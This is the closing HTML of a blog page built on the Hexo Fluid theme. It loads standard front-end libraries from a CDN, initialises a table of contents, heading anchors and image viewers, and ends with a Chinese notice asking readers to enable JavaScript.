
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
